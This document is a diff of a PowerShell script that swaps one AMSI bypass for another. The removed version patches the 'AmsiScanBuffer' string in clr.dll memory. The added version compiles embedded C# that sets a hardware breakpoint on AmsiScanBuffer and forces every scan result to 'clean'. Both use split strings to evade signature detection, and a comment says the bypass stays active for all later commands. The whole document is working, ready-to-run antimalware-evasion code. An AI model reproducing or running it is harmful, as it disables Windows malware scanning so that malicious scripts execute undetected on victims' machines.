@@ -1,161 +1,299 @@
-# Define Constants
-$PAGE_READONLY = 0x02
-$PAGE_READWRITE = 0x04
-$PAGE_EXECUTE_READWRITE = 0x40
-$PAGE_EXECUTE_READ = 0x20
-$PAGE_GUARD = 0x100
-$MEM_COMMIT = 0x1000
-$MAX_PATH = 260
+$HardwareBreakpoint = @"
+// Technique from @_EthicalChaos_ (https://twitter.com/_EthicalChaos_)
+// Original Code by @d_tranman: https://twitter.com/d_tranman/status/1628954053115002881
+// Slight modifications by @ShitSecure for Powershell runtime compitability as the original code could not be used like this. Also the removal of the Hardware breakpoint was removed, so that every following future Powershell command bypasses AMSI as well.
 
-# Helper functions
-function IsReadable {
-    param ($protect, $state)
-    return ((($protect -band $PAGE_READONLY) -eq $PAGE_READONLY -or ($protect -band $PAGE_READWRITE) -eq $PAGE_READWRITE -or ($protect -band $PAGE_EXECUTE_READWRITE) -eq $PAGE_EXECUTE_READWRITE -or ($protect -band $PAGE_EXECUTE_READ) -eq $PAGE_EXECUTE_READ) -and ($protect -band $PAGE_GUARD) -ne $PAGE_GUARD -and ($state -band $MEM_COMMIT) -eq $MEM_COMMIT)
-}
+using System;
+using System.Collections.Generic;
+using System.Linq.Expressions;
+using System.Linq;
+using System.Runtime.CompilerServices;
+using System.Net;
+using System.Reflection;
+using System.Runtime.InteropServices;
 
-function PatternMatch {
-    param ($buffer, $pattern, $index)
-    for ($i = 0; $i -lt $pattern.Length; $i++) {
-        if ($buffer[$index + $i] -ne $pattern[$i]) {
-            return $false
+namespace Test
+{
+    // CCOB IS THE GOAT
+   
+    public class Program
+    {
+        static string a = "msi";
+        static string b = "anB";
+        static string c = "ff";
+        static IntPtr BaseAddress = WinAPI.LoadLibrary("a" + a + ".dll");
+        static IntPtr pABuF = WinAPI.GetProcAddress(BaseAddress, "A" + a + "Sc" + b + "u" + c + "er");
+        static IntPtr pCtx = Marshal.AllocHGlobal(Marshal.SizeOf(typeof(WinAPI.CONTEXT64)));
+        
+        public static void SetupBypass()
+        {
+
+            WinAPI.CONTEXT64 ctx = new WinAPI.CONTEXT64();
+            ctx.ContextFlags = WinAPI.CONTEXT64_FLAGS.CONTEXT64_ALL;
+
+            MethodInfo method = typeof(Program).GetMethod("Handler", BindingFlags.Static | BindingFlags.Public);
+            IntPtr hExHandler = WinAPI.AddVectoredExceptionHandler(1, method.MethodHandle.GetFunctionPointer());
+            
+            // Saving our context to a struct
+            Marshal.StructureToPtr(ctx, pCtx, true);
+            bool b = WinAPI.GetThreadContext((IntPtr)(-2), pCtx);
+            ctx = (WinAPI.CONTEXT64)Marshal.PtrToStructure(pCtx, typeof(WinAPI.CONTEXT64));
+
+            EnableBreakpoint(ctx, pABuF, 0);
+
+            WinAPI.SetThreadContext((IntPtr)(-2), pCtx);
+
+        }
+        
+        public static long Handler(IntPtr exceptions)
+        {
+            WinAPI.EXCEPTION_POINTERS ep = new WinAPI.EXCEPTION_POINTERS();
+            ep = (WinAPI.EXCEPTION_POINTERS)Marshal.PtrToStructure(exceptions, typeof(WinAPI.EXCEPTION_POINTERS));
+
+            WinAPI.EXCEPTION_RECORD ExceptionRecord = new WinAPI.EXCEPTION_RECORD();
+            ExceptionRecord = (WinAPI.EXCEPTION_RECORD)Marshal.PtrToStructure(ep.pExceptionRecord, typeof(WinAPI.EXCEPTION_RECORD));
+
+            WinAPI.CONTEXT64 ContextRecord = new WinAPI.CONTEXT64();
+            ContextRecord = (WinAPI.CONTEXT64)Marshal.PtrToStructure(ep.pContextRecord, typeof(WinAPI.CONTEXT64));
+
+            if (ExceptionRecord.ExceptionCode == WinAPI.EXCEPTION_SINGLE_STEP && ExceptionRecord.ExceptionAddress == pABuF)
+            {
+                ulong ReturnAddress = (ulong)Marshal.ReadInt64((IntPtr)ContextRecord.Rsp);
+
+                // THE OUTPUT AMSIRESULT IS A POINTER, NOT THE EXPLICIT VALUE AAAAAAAAAA
+                IntPtr ScanResult = Marshal.ReadIntPtr((IntPtr)(ContextRecord.Rsp + (6 * 8))); // 5th arg, swap it to clean
+                //Console.WriteLine("Buffer: 0x{0:X}", (long)ContextRecord.R8);
+                //Console.WriteLine("Scan Result: 0x{0:X}", Marshal.ReadInt32(ScanResult));
+
+                Marshal.WriteInt32(ScanResult, 0, WinAPI.AMSI_RESULT_CLEAN);
+
+                ContextRecord.Rip = ReturnAddress;
+                ContextRecord.Rsp += 8;
+                ContextRecord.Rax = 0; // S_OK
+                
+                Marshal.StructureToPtr(ContextRecord, ep.pContextRecord, true); //Paste our altered ctx back in TO THE RIGHT STRUCT
+                return WinAPI.EXCEPTION_CONTINUE_EXECUTION;
+            }
+            else
+            {
+                return WinAPI.EXCEPTION_CONTINUE_SEARCH;
+            }
+
+        }
+        public static void EnableBreakpoint(WinAPI.CONTEXT64 ctx, IntPtr address, int index)
+        {
+
+            switch (index)
+            {
+                case 0:
+                    ctx.Dr0 = (ulong)address.ToInt64();
+                    break;
+                case 1:
+                    ctx.Dr1 = (ulong)address.ToInt64();
+                    break;
+                case 2:
+                    ctx.Dr2 = (ulong)address.ToInt64();
+                    break;
+                case 3:
+                    ctx.Dr3 = (ulong)address.ToInt64();
+                    break;
+            }
+
+            //Set bits 16-31 as 0, which sets
+            //DR0-DR3 HBP's for execute HBP
+            ctx.Dr7 = SetBits(ctx.Dr7, 16, 16, 0);
+
+            //Set DRx HBP as enabled for local mode
+            ctx.Dr7 = SetBits(ctx.Dr7, (index * 2), 1, 1);
+            ctx.Dr6 = 0;
+
+            // Now copy the changed ctx into the original struct
+            Marshal.StructureToPtr(ctx, pCtx, true);
+        }
+        public static ulong SetBits(ulong dw, int lowBit, int bits, ulong newValue)
+        {
+            ulong mask = (1UL << bits) - 1UL;
+            dw = (dw & ~(mask << lowBit)) | (newValue << lowBit);
+            return dw;
         }
     }
-    return $true
-}
+    public class WinAPI
+    {
+        public const UInt32 DBG_CONTINUE = 0x00010002;
+        public const UInt32 DBG_EXCEPTION_NOT_HANDLED = 0x80010001;
+        public const Int32 EXCEPTION_CONTINUE_EXECUTION = -1;
+        public const Int32 EXCEPTION_CONTINUE_SEARCH = 0;
+        public const Int32 CREATE_PROCESS_DEBUG_EVENT = 3;
+        public const Int32 CREATE_THREAD_DEBUG_EVENT = 2;
+        public const Int32 EXCEPTION_DEBUG_EVENT = 1;
+        public const Int32 EXIT_PROCESS_DEBUG_EVENT = 5;
+        public const Int32 EXIT_THREAD_DEBUG_EVENT = 4;
+        public const Int32 LOAD_DLL_DEBUG_EVENT = 6;
+        public const Int32 OUTPUT_DEBUG_STRING_EVENT = 8;
+        public const Int32 RIP_EVENT = 9;
+        public const Int32 UNLOAD_DLL_DEBUG_EVENT = 7;
 
-if ($PSVersionTable.PSVersion.Major -gt 2) {
-    # Create module builder
-    $DynAssembly = New-Object System.Reflection.AssemblyName("Win32")
-    $AssemblyBuilder = [AppDomain]::CurrentDomain.DefineDynamicAssembly($DynAssembly, [Reflection.Emit.AssemblyBuilderAccess]::Run)
-    $ModuleBuilder = $AssemblyBuilder.DefineDynamicModule("Win32", $False)
+        public const UInt32 EXCEPTION_ACCESS_VIOLATION = 0xC0000005;
+        public const UInt32 EXCEPTION_BREAKPOINT = 0x80000003;
+        public const UInt32 EXCEPTION_DATATYPE_MISALIGNMENT = 0x80000002;
+        public const UInt32 EXCEPTION_SINGLE_STEP = 0x80000004;
+        public const UInt32 EXCEPTION_ARRAY_BOUNDS_EXCEEDED = 0xC000008C;
+        public const UInt32 EXCEPTION_INT_DIVIDE_BY_ZERO = 0xC0000094;
+        public const UInt32 DBG_CONTROL_C = 0x40010006;
+        public const UInt32 DEBUG_PROCESS = 0x00000001;
+        public const UInt32 CREATE_SUSPENDED = 0x00000004;
+        public const UInt32 CREATE_NEW_CONSOLE = 0x00000010;
 
-    # Define structs
-    $TypeBuilder = $ModuleBuilder.DefineType("Win32.MEMORY_INFO_BASIC", [System.Reflection.TypeAttributes]::Public + [System.Reflection.TypeAttributes]::Sealed + [System.Reflection.TypeAttributes]::SequentialLayout, [System.ValueType])
-    [void]$TypeBuilder.DefineField("BaseAddress", [IntPtr], [System.Reflection.FieldAttributes]::Public)
-    [void]$TypeBuilder.DefineField("AllocationBase", [IntPtr], [System.Reflection.FieldAttributes]::Public)
-    [void]$TypeBuilder.DefineField("AllocationProtect", [Int32], [System.Reflection.FieldAttributes]::Public)
-    [void]$TypeBuilder.DefineField("RegionSize", [IntPtr], [System.Reflection.FieldAttributes]::Public)
-    [void]$TypeBuilder.DefineField("State", [Int32], [System.Reflection.FieldAttributes]::Public)
-    [void]$TypeBuilder.DefineField("Protect", [Int32], [System.Reflection.FieldAttributes]::Public)
-    [void]$TypeBuilder.DefineField("Type", [Int32], [System.Reflection.FieldAttributes]::Public)
-    $MEMORY_INFO_BASIC_STRUCT = $TypeBuilder.CreateType()
+        public const Int32 AMSI_RESULT_CLEAN = 0;
 
-    # Define structs
-    $TypeBuilder = $ModuleBuilder.DefineType("Win32.SYSTEM_INFO", [System.Reflection.TypeAttributes]::Public + [System.Reflection.TypeAttributes]::Sealed + [System.Reflection.TypeAttributes]::SequentialLayout, [System.ValueType])
-    [void]$TypeBuilder.DefineField("wProcessorArchitecture", [UInt16], [System.Reflection.FieldAttributes]::Public)
-    [void]$TypeBuilder.DefineField("wReserved", [UInt16], [System.Reflection.FieldAttributes]::Public)
-    [void]$TypeBuilder.DefineField("dwPageSize", [UInt32], [System.Reflection.FieldAttributes]::Public)
-    [void]$TypeBuilder.DefineField("lpMinimumApplicationAddress", [IntPtr], [System.Reflection.FieldAttributes]::Public)
-    [void]$TypeBuilder.DefineField("lpMaximumApplicationAddress", [IntPtr], [System.Reflection.FieldAttributes]::Public)
-    [void]$TypeBuilder.DefineField("dwActiveProcessorMask", [IntPtr], [System.Reflection.FieldAttributes]::Public)
-    [void]$TypeBuilder.DefineField("dwNumberOfProcessors", [UInt32], [System.Reflection.FieldAttributes]::Public)
-    [void]$TypeBuilder.DefineField("dwProcessorType", [UInt32], [System.Reflection.FieldAttributes]::Public)
-    [void]$TypeBuilder.DefineField("dwAllocationGranularity", [UInt32], [System.Reflection.FieldAttributes]::Public)
-    [void]$TypeBuilder.DefineField("wProcessorLevel", [UInt16], [System.Reflection.FieldAttributes]::Public)
-    [void]$TypeBuilder.DefineField("wProcessorRevision", [UInt16], [System.Reflection.FieldAttributes]::Public)
-    $SYSTEM_INFO_STRUCT = $TypeBuilder.CreateType()
+        [DllImport("kernel32.dll", SetLastError = true)]
+        public static extern bool SetThreadContext(IntPtr hThread, IntPtr lpContext);
+        [DllImport("kernel32.dll", SetLastError = true)]
+        public static extern bool GetThreadContext(IntPtr hThread, IntPtr lpContext);
+        [DllImport("kernel32.dll", SetLastError = true)]
+        public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
+        [DllImport("kernel32", SetLastError = true, CharSet = CharSet.Ansi)]
+        public static extern IntPtr LoadLibrary([MarshalAs(UnmanagedType.LPStr)] string lpFileName);
 
-    # P/Invoke Methods
-    $TypeBuilder = $ModuleBuilder.DefineType("Win32.Kernel32", "Public, Class")
-    $DllImportConstructor = [Runtime.InteropServices.DllImportAttribute].GetConstructor(@([String]))
-    $SetLastError = [Runtime.InteropServices.DllImportAttribute].GetField("SetLastError")
-    $SetLastErrorCustomAttribute = New-Object Reflection.Emit.CustomAttributeBuilder($DllImportConstructor, "kernel32.dll", [Reflection.FieldInfo[]]@($SetLastError), @($True))
-
-    # Define [Win32.Kernel32]::VirtualProtect
-    $PInvokeMethod = $TypeBuilder.DefinePInvokeMethod("VirtualProtect", "kernel32.dll", ([Reflection.MethodAttributes]::Public -bor [Reflection.MethodAttributes]::Static), [Reflection.CallingConventions]::Standard, [bool], [Type[]]@([IntPtr], [IntPtr], [Int32], [Int32].MakeByRefType()), [Runtime.InteropServices.CallingConvention]::Winapi, [Runtime.InteropServices.CharSet]::Auto)
-    $PInvokeMethod.SetCustomAttribute($SetLastErrorCustomAttribute)
-
-    # Define [Win32.Kernel32]::GetCurrentProcess
-    $PInvokeMethod = $TypeBuilder.DefinePInvokeMethod("GetCurrentProcess", "kernel32.dll", ([Reflection.MethodAttributes]::Public -bor [Reflection.MethodAttributes]::Static), [Reflection.CallingConventions]::Standard, [IntPtr], [Type[]]@(), [Runtime.InteropServices.CallingConvention]::Winapi, [Runtime.InteropServices.CharSet]::Auto)
-    $PInvokeMethod.SetCustomAttribute($SetLastErrorCustomAttribute)
-
-    # Define [Win32.Kernel32]::VirtualQuery
-    $PInvokeMethod = $TypeBuilder.DefinePInvokeMethod("VirtualQuery", "kernel32.dll", ([Reflection.MethodAttributes]::Public -bor [Reflection.MethodAttributes]::Static), [Reflection.CallingConventions]::Standard, [IntPtr], [Type[]]@([IntPtr], [Win32.MEMORY_INFO_BASIC].MakeByRefType(), [uint32]), [Runtime.InteropServices.CallingConvention]::Winapi, [Runtime.InteropServices.CharSet]::Auto)
-    $PInvokeMethod.SetCustomAttribute($SetLastErrorCustomAttribute)
-
-    # Define [Win32.Kernel32]::GetSystemInfo
-    $PInvokeMethod = $TypeBuilder.DefinePInvokeMethod("GetSystemInfo", "kernel32.dll", ([Reflection.MethodAttributes]::Public -bor [Reflection.MethodAttributes]::Static), [Reflection.CallingConventions]::Standard, [void], [Type[]]@([Win32.SYSTEM_INFO].MakeByRefType()), [Runtime.InteropServices.CallingConvention]::Winapi, [Runtime.InteropServices.CharSet]::Auto)
-    $PInvokeMethod.SetCustomAttribute($SetLastErrorCustomAttribute)
-
-    # Define [Win32.Kernel32]::GetMappedFileName
-    $PInvokeMethod = $TypeBuilder.DefinePInvokeMethod("GetMappedFileName", "psapi.dll", ([Reflection.MethodAttributes]::Public -bor [Reflection.MethodAttributes]::Static), [Reflection.CallingConventions]::Standard, [Int32], [Type[]]@([IntPtr], [IntPtr], [System.Text.StringBuilder], [uint32]), [Runtime.InteropServices.CallingConvention]::Winapi, [Runtime.InteropServices.CharSet]::Auto)
-    $PInvokeMethod.SetCustomAttribute($SetLastErrorCustomAttribute)
-
-    # Define [Win32.Kernel32]::ReadProcessMemory
-    $PInvokeMethod = $TypeBuilder.DefinePInvokeMethod("ReadProcessMemory", "kernel32.dll", ([Reflection.MethodAttributes]::Public -bor [Reflection.MethodAttributes]::Static), [Reflection.CallingConventions]::Standard, [Int32], [Type[]]@([IntPtr], [IntPtr], [byte[]], [int], [int].MakeByRefType()), [Runtime.InteropServices.CallingConvention]::Winapi, [Runtime.InteropServices.CharSet]::Auto)
-    $PInvokeMethod.SetCustomAttribute($SetLastErrorCustomAttribute)
-
-    # Define [Win32.Kernel32]::WriteProcessMemory
-    $PInvokeMethod = $TypeBuilder.DefinePInvokeMethod("WriteProcessMemory", "kernel32.dll", ([Reflection.MethodAttributes]::Public -bor [Reflection.MethodAttributes]::Static), [Reflection.CallingConventions]::Standard, [Int32], [Type[]]@([IntPtr], [IntPtr], [byte[]], [int], [int].MakeByRefType()), [Runtime.InteropServices.CallingConvention]::Winapi, [Runtime.InteropServices.CharSet]::Auto)
-    $PInvokeMethod.SetCustomAttribute($SetLastErrorCustomAttribute)
-
-    $Kernel32 = $TypeBuilder.CreateType()
-
-    $a = "Ams"
-    $b = "iSc"
-    $c = "anBuf"
-    $d = "fer"
-    $signature = [System.Text.Encoding]::UTF8.GetBytes($a + $b + $c + $d)
-    $hProcess = [Win32.Kernel32]::GetCurrentProcess()
-
-    # Get system information
-    $sysInfo = New-Object Win32.SYSTEM_INFO
-    [void][Win32.Kernel32]::GetSystemInfo([ref]$sysInfo)
-
-    # List of memory regions to scan
-    $memoryRegions = @()
-    $address = [IntPtr]::Zero
-
-    # Scan through memory regions
-    while ($address.ToInt64() -lt $sysInfo.lpMaximumApplicationAddress.ToInt64()) {
-        $memInfo = New-Object Win32.MEMORY_INFO_BASIC
-        if ([Win32.Kernel32]::VirtualQuery($address, [ref]$memInfo, [System.Runtime.InteropServices.Marshal]::SizeOf($memInfo))) {
-            $memoryRegions += $memInfo
+        [DllImport("Kernel32.dll")]
+        public static extern IntPtr AddVectoredExceptionHandler(uint First, IntPtr Handler);
+        [Flags]
+        public enum CONTEXT64_FLAGS : uint
+        {
+            CONTEXT64_AMD64 = 0x100000,
+            CONTEXT64_CONTROL = CONTEXT64_AMD64 | 0x01,
+            CONTEXT64_INTEGER = CONTEXT64_AMD64 | 0x02,
+            CONTEXT64_SEGMENTS = CONTEXT64_AMD64 | 0x04,
+            CONTEXT64_FLOATING_POINT = CONTEXT64_AMD64 | 0x08,
+            CONTEXT64_DEBUG_REGISTERS = CONTEXT64_AMD64 | 0x10,
+            CONTEXT64_FULL = CONTEXT64_CONTROL | CONTEXT64_INTEGER | CONTEXT64_FLOATING_POINT,
+            CONTEXT64_ALL = CONTEXT64_CONTROL | CONTEXT64_INTEGER | CONTEXT64_SEGMENTS | CONTEXT64_FLOATING_POINT | CONTEXT64_DEBUG_REGISTERS
         }
-        # Move to the next memory region
-        $address = New-Object IntPtr($memInfo.BaseAddress.ToInt64() + $memInfo.RegionSize.ToInt64())
-    }
+        [StructLayout(LayoutKind.Sequential)]
+        public struct M128A
+        {
+            public ulong High;
+            public long Low;
 
-    $count = 0
-
-    # Loop through memory regions
-    foreach ($region in $memoryRegions) {
-        # Check if the region is readable and writable
-        if (-not (IsReadable $region.Protect $region.State)) {
-            continue
-        }
-        # Check if the region contains a mapped file
-        $pathBuilder = New-Object System.Text.StringBuilder $MAX_PATH
-        if ([Win32.Kernel32]::GetMappedFileName($hProcess, $region.BaseAddress, $pathBuilder, $MAX_PATH) -gt 0) {
-            $path = $pathBuilder.ToString()
-            if ($path.EndsWith("clr.dll", [StringComparison]::InvariantCultureIgnoreCase)) {
-                # Scan the region for the pattern
-                $buffer = New-Object byte[] $region.RegionSize.ToInt64()
-                $bytesRead = 0
-                [void][Win32.Kernel32]::ReadProcessMemory($hProcess, $region.BaseAddress, $buffer, $buffer.Length, [ref]$bytesRead)
-                for ($k = 0; $k -lt ($bytesRead - $signature.Length); $k++) {
-                    $found = $True
-                    for ($m = 0; $m -lt $signature.Length; $m++) {
-                        if ($buffer[$k + $m] -ne $signature[$m]) {
-                            $found = $False
-                            break
-                        }
-                    }
-                    if ($found) {
-                        $oldProtect = 0
-                        if (($region.Protect -band $PAGE_READWRITE) -ne $PAGE_READWRITE) {
-                            [void][Win32.Kernel32]::VirtualProtect($region.BaseAddress, $buffer.Length, $PAGE_EXECUTE_READWRITE, [ref]$oldProtect)
-                        }
-                        $replacement = New-Object byte[] $signature.Length
-                        $bytesWritten = 0
-                        [void][Win32.Kernel32]::WriteProcessMemory($hProcess, [IntPtr]::Add($region.BaseAddress, $k), $replacement, $replacement.Length, [ref]$bytesWritten)
-                        $count++
-                        if (($region.Protect -band $PAGE_READWRITE) -ne $PAGE_READWRITE) {
-                            [void][Win32.Kernel32]::VirtualProtect($region.BaseAddress, $buffer.Length, $region.Protect, [ref]$oldProtect)
-                        }
-                    }
-                }
+            public override string ToString()
+            {
+                return string.Format("High:{0}, Low:{1}", this.High, this.Low);
             }
         }
+
+        /// <summary>
+        /// x64
+        /// </summary>
+        [StructLayout(LayoutKind.Sequential, Pack = 16)]
+        public struct XSAVE_FORMAT64
+        {
+            public ushort ControlWord;
+            public ushort StatusWord;
+            public byte TagWord;
+            public byte Reserved1;
+            public ushort ErrorOpcode;
+            public uint ErrorOffset;
+            public ushort ErrorSelector;
+            public ushort Reserved2;
+            public uint DataOffset;
+            public ushort DataSelector;
+            public ushort Reserved3;
+            public uint MxCsr;
+            public uint MxCsr_Mask;
+
+            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 8)]
+            public M128A[] FloatRegisters;
+
+            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 16)]
+            public M128A[] XmmRegisters;
+
+            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 96)]
+            public byte[] Reserved4;
+        }
+
+        /// <summary>
+        /// x64
+        /// </summary>
+        [StructLayout(LayoutKind.Sequential, Pack = 16)]
+        public struct CONTEXT64
+        {
+            public ulong P1Home;
+            public ulong P2Home;
+            public ulong P3Home;
+            public ulong P4Home;
+            public ulong P5Home;
+            public ulong P6Home;
+
+            public CONTEXT64_FLAGS ContextFlags;
+            public uint MxCsr;
+
+            public ushort SegCs;
+            public ushort SegDs;
+            public ushort SegEs;
+            public ushort SegFs;
+            public ushort SegGs;
+            public ushort SegSs;
+            public uint EFlags;
+
+            public ulong Dr0;
+            public ulong Dr1;
+            public ulong Dr2;
+            public ulong Dr3;
+            public ulong Dr6;
+            public ulong Dr7;
+
+            public ulong Rax;
+            public ulong Rcx;
+            public ulong Rdx;
+            public ulong Rbx;
+            public ulong Rsp;
+            public ulong Rbp;
+            public ulong Rsi;
+            public ulong Rdi;
+            public ulong R8;
+            public ulong R9;
+            public ulong R10;
+            public ulong R11;
+            public ulong R12;
+            public ulong R13;
+            public ulong R14;
+            public ulong R15;
+            public ulong Rip;
+
+            public XSAVE_FORMAT64 DUMMYUNIONNAME;
+
+            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 26)]
+            public M128A[] VectorRegister;
+            public ulong VectorControl;
+
+            public ulong DebugControl;
+            public ulong LastBranchToRip;
+            public ulong LastBranchFromRip;
+            public ulong LastExceptionToRip;
+            public ulong LastExceptionFromRip;
+        }
+        [StructLayout(LayoutKind.Sequential)]
+        public struct EXCEPTION_RECORD
+        {
+            public uint ExceptionCode;
+            public uint ExceptionFlags;
+            public IntPtr ExceptionRecord;
+            public IntPtr ExceptionAddress;
+            public uint NumberParameters;
+            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 15, ArraySubType = UnmanagedType.U4)] public uint[] ExceptionInformation;
+        }
+        [StructLayout(LayoutKind.Sequential)]
+        public struct EXCEPTION_POINTERS
+        {
+            public IntPtr pExceptionRecord;
+            public IntPtr pContextRecord;
+        }
     }
 }
+
+
+"@
+
+Add-Type -TypeDefinition $HardwareBreakpoint
+
+[Test.Program]::SetupBypass()
